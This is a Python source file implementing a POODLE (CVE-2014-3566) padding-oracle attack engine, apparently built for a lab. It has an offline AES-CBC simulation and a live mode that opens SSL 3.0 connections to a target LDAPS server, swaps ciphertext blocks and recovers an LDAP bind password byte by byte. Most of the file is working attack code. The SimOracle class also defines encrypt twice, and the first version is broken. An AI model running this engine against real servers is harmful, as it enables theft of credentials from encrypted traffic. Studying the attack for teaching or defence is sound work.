"""poodle_engine.py — POODLE (CVE-2014-3566) attack engine.

Two modes:
  - Simulation (default): self-contained AES-128-CBC crypto, no network needed
  - Real oracle: each query opens a live SSL 3.0 connection to the target server

In both modes the byte-recovery math is identical.
"""

import os
import struct
import hmac
import hashlib
import time
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

BLOCK_SIZE = 16
MAC_LEN    = 20


# ── Simulation oracle (self-contained) ───────────────────────────────────────

class SimOracle:
    """Local AES-128-CBC oracle — no network, educational/offline use."""

    def __init__(self):
        self.aes_key = os.urandom(16)
        self.mac_key = os.urandom(20)
        self.seq_num = 0

    def _mac(self, plaintext: bytes) -> bytes:
        self.seq_num += 1
        hdr = struct.pack(">Q", self.seq_num) + b"\x17" + struct.pack(">H", len(plaintext))
        return hmac.new(self.mac_key, hdr + plaintext, hashlib.sha1).digest()

    def _pad(self, data: bytes) -> bytes:
        need = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
        if need == 0:
            need = BLOCK_SIZE
        pad_len = need - 1
        return data + os.urandom(pad_len) + bytes([pad_len])

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        """Returns (iv, ciphertext)."""
        mac    = self._mac(plaintext)
        padded = self._pad(plaintext + mac)
        iv     = os.urandom(BLOCK_SIZE)
        c      = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
        ct     = c.encryptor().update(padded) + c.encryptor().finalize()
        return iv, ct

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        mac    = self._mac(plaintext)
        padded = self._pad(plaintext + mac)
        iv     = os.urandom(BLOCK_SIZE)
        enc    = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv)).encryptor()
        ct     = enc.update(padded) + enc.finalize()
        return iv, ct

    def pad_length(self, plaintext_len: int) -> int:
        total    = plaintext_len + MAC_LEN
        pad_need = BLOCK_SIZE - (total % BLOCK_SIZE)
        if pad_need == 0:
            pad_need = BLOCK_SIZE
        return pad_need - 1

    def check(self, iv: bytes, ciphertext: bytes, expected_pad: int) -> bool:
        """SSL 3.0 padding oracle: check if last decrypted byte == expected_pad."""
        dec = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv)).decryptor()
        return (dec.update(ciphertext) + dec.finalize())[-1] == expected_pad


# ── Real oracle (live SSL 3.0) ────────────────────────────────────────────────

class RealOracle:
    """Live oracle against SSL 3.0 LDAPS — one TCP connection per query."""

    def __init__(self, host: str, port: int, dn_base: str = "labuser@lab.local"):
        from real_oracle import compute_dn_lengths, build_ldap_bind_with_control
        from ssl3_client import SSL3Client

        self.host    = host
        self.port    = port
        self.dn_base = dn_base
        self._SSL3Client = SSL3Client
        self._compute_dn_lengths = compute_dn_lengths
        self._build_ldap = build_ldap_bind_with_control
        self._layouts = None   # computed once per password
        self.block_size = None # determined after first connection (probe)

    def probe(self) -> int:
        """Connect once to the server to discover the negotiated cipher suite."""
        client = self._SSL3Client(self.host, self.port)
        client.connect()
        bs = client.suite.block_size
        client.close()
        self.block_size = bs
        return bs

    def prepare(self, password: str) -> None:
        if self.block_size is None:
            self.probe()
        self._layouts = self._compute_dn_lengths(password, self.block_size,
                                                  len(self.dn_base))

    def encrypt_for_byte(self, password: str, byte_index: int) -> tuple[bytes, bytes, int, int, list]:
        """
        Open SSL 3.0 connection, encrypt the LDAP bind with proper alignment.

        Returns (iv, ciphertext, target_block_idx, last_block_idx, all_blocks)
        where all_blocks = [iv_block, C0, C1, ..., Cn].
        """
        if self._layouts is None:
            self.prepare(password)

        layout = self._layouts[byte_index]
        plaintext = self._build_ldap(
            self.dn_base, password,
            dn_prefix_len=layout["dn_prefix_len"],
            control_pad_len=layout["control_pad_len"],
        )

        client = self._SSL3Client(self.host, self.port)
        client.connect()
        self.block_size = client.suite.block_size

        ct, iv = client.encrypt_appdata(plaintext)  # full-block padding always
        client.close()

        bs = self.block_size
        blocks = [iv] + [ct[i:i+bs] for i in range(0, len(ct), bs)]

        # Absolute position of password byte i:
        # 14 (fixed LDAP overhead) + dn_prefix + dn_base + i
        abs_pos          = 14 + layout["dn_prefix_len"] + len(self.dn_base) + byte_index
        target_block_idx = abs_pos // bs + 1  # +1 because blocks[0] is IV
        last_block_idx   = len(blocks) - 1

        return iv, ct, target_block_idx, last_block_idx, blocks

    def query(self, password: str, byte_index: int,
              blocks: list, target_block_idx: int) -> bool:
        """
        Send a modified LDAP bind record to the server and check the response.

        Replaces the last ciphertext block with blocks[target_block_idx].
        Returns True if server sends application data (oracle HIT).

        Uses a fresh SSL 3.0 connection with the SAME plaintext/keys,
        so the session IV and encryption match.
        """
        if self._layouts is None:
            self.prepare(password)

        layout    = self._layouts[byte_index]
        plaintext = self._build_ldap(
            self.dn_base, password,
            dn_prefix_len=layout["dn_prefix_len"],
            control_pad_len=layout["control_pad_len"],
        )

        client = self._SSL3Client(self.host, self.port)
        try:
            client.connect()
            bs = client.suite.block_size

            # Encrypt this request (keys differ each connection!)
            ct, iv = client.encrypt_appdata(plaintext)

            # Get fresh blocks from this connection's ciphertext
            fresh_blocks = [iv] + [ct[i:i+bs] for i in range(0, len(ct), bs)]

            # Absolute position of password byte i in the LDAP message
            abs_pos          = 14 + layout["dn_prefix_len"] + len(self.dn_base) + byte_index
            tgt_idx          = abs_pos // bs + 1
            last_idx         = len(fresh_blocks) - 1

            # POODLE swap: replace last block with target block
            modified_blocks = fresh_blocks.copy()
            modified_blocks[last_idx] = fresh_blocks[tgt_idx]
            modified_ct = b"".join(modified_blocks[1:])

            # Send modified record and check response
            client.send_raw_appdata(modified_ct, iv)
            kind, _ = client.read_response()

            if kind == "appdata":
                # Store the winning blocks so the caller can recover the byte
                self._last_fresh_blocks     = fresh_blocks
                self._last_tgt_idx          = tgt_idx
                self._last_idx              = last_idx
                self._last_bs               = bs
                return True
            return False

        except Exception:
            return False
        finally:
            client.close()

    def recover_byte_value(self) -> int:
        """After a HIT, compute the recovered byte value.

        pad_len = block_size - 1  (always, because we use force_full_block=True)
        recovered = pad_len XOR c_before_last[-1] XOR c_before_target[-1]
        """
        bs              = self._last_bs
        pad_len         = bs - 1
        c_before_target = self._last_fresh_blocks[self._last_tgt_idx - 1]
        c_before_last   = self._last_fresh_blocks[self._last_idx - 1]
        return pad_len ^ c_before_last[-1] ^ c_before_target[-1]


# ── Main Engine ───────────────────────────────────────────────────────────────

class PoodleEngine:

    def __init__(self, secret_password: str,
                 attempt_delay: float = 0.003,
                 real_oracle: "RealOracle | None" = None):
        self.secret_password = secret_password
        self.attempt_delay   = attempt_delay
        self.real            = real_oracle          # None → simulation mode
        self._stop           = threading.Event()

        # Simulation-mode state
        self._sim            = SimOracle() if real_oracle is None else None
        self.plaintext_record = (
            "LDAP Simple Bind: "
            "CN=labuser,DC=lab,DC=local "
            f"PASS={secret_password}"
        ).encode()
        marker = b"PASS="
        self.password_offset = self.plaintext_record.index(marker) + len(marker)

    def stop(self):
        self._stop.set()

    @property
    def stopped(self):
        return self._stop.is_set()

    def get_block_layout(self, prefix_len: int, block_size: int = BLOCK_SIZE) -> dict:
        total_before = prefix_len + len(self.plaintext_record) + MAC_LEN
        pad_need = block_size - (total_before % block_size)
        if pad_need == 0:
            pad_need = block_size
        total = total_before + pad_need
        return {
            "prefix_len":   prefix_len,
            "plaintext_len": len(self.plaintext_record),
            "mac_len":       MAC_LEN,
            "pad_len":       pad_need,
            "total_len":     total,
            "n_blocks":      total // block_size,
        }

    def recover_byte(self, target_byte_index: int,
                     callback=None) -> tuple[int, int]:
        """Recover one password byte. Returns (byte_value, total_attempts)."""
        if self.real is not None:
            return self._recover_byte_real(target_byte_index, callback)
        return self._recover_byte_sim(target_byte_index, callback)

    # ── Simulation mode ────────────────────────────────────────────────────

    def _recover_byte_sim(self, idx: int, callback) -> tuple[int, int]:
        abs_pos      = self.password_offset + idx
        prefix_len   = (BLOCK_SIZE - 1 - abs_pos % BLOCK_SIZE) % BLOCK_SIZE
        expected_pad = self._sim.pad_length(prefix_len + len(self.plaintext_record))

        attempts = 0
        while not self.stopped:
            attempts += 1
            full_pt  = (b"X" * prefix_len) + self.plaintext_record
            iv, ct   = self._sim.encrypt(full_pt)

            blocks = [iv] + [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
            tgt_idx  = (prefix_len + abs_pos) // BLOCK_SIZE + 1
            last_idx = len(blocks) - 1

            modified = blocks.copy()
            modified[last_idx] = blocks[tgt_idx]
            mod_ct = b"".join(modified[1:])

            hit = self._sim.check(modified[0], mod_ct, expected_pad)
            if callback:
                callback(attempts, hit)

            if hit:
                c_prev_tgt  = blocks[tgt_idx - 1]
                c_prev_last = blocks[last_idx - 1]
                val = expected_pad ^ c_prev_last[-1] ^ c_prev_tgt[-1]
                return val, attempts

            if self.attempt_delay > 0:
                time.sleep(self.attempt_delay)

        return -1, attempts

    # ── Real oracle mode ───────────────────────────────────────────────────

    def _recover_byte_real(self, idx: int, callback) -> tuple[int, int]:
        attempts = 0
        while not self.stopped:
            attempts += 1

            hit = self.real.query(self.secret_password, idx,
                                  blocks=None, target_block_idx=None)
            if callback:
                callback(attempts, hit)

            if hit:
                val = self.real.recover_byte_value()
                return val, attempts

            if self.attempt_delay > 0:
                time.sleep(self.attempt_delay)

        return -1, attempts

    # ── Full attack ────────────────────────────────────────────────────────

    def run_attack(self, callback=None) -> str:
        pw_len = len(self.secret_password)

        # Determine actual block size (probe server if real oracle mode)
        bs = BLOCK_SIZE
        if self.real is not None:
            if self.real.block_size is None:
                self.real.probe()
            bs = self.real.block_size

        prefix_len = (bs - 1 - self.password_offset % bs) % bs
        block_info = self.get_block_layout(prefix_len, bs)

        if callback:
            mode = "real" if self.real else "simulation"
            callback("started", {
                "total_bytes":    pw_len,
                "block_info":     block_info,
                "record_preview": self.plaintext_record.decode(errors="replace"),
                "mode":           mode,
            })

        recovered      = []
        total_attempts = 0

        for i in range(pw_len):
            if self.stopped:
                break

            def byte_cb(attempt_num, oracle_hit, _i=i):
                if callback:
                    callback("attempt", {
                        "byte_index":  _i,
                        "attempt_num": attempt_num,
                        "oracle_hit":  oracle_hit,
                    })

            byte_val, attempts = self.recover_byte(i, byte_cb)
            total_attempts    += attempts

            if byte_val < 0:
                break

            recovered.append(byte_val)
            byte_char = chr(byte_val) if 32 <= byte_val < 127 else "."

            if callback:
                callback("byte_recovered", {
                    "byte_index":    i,
                    "byte_value":    byte_val,
                    "byte_char":     byte_char,
                    "attempts":      attempts,
                    "total_attempts": total_attempts,
                    "progress":      (i + 1) / pw_len,
                })

        full_message = bytes(recovered).decode(errors="replace")

        if callback and not self.stopped:
            callback("complete", {
                "full_message":          full_message,
                "total_attempts":        total_attempts,
                "recovered_bytes":       len(recovered),
                "avg_attempts_per_byte": total_attempts / max(len(recovered), 1),
            })

        return full_message
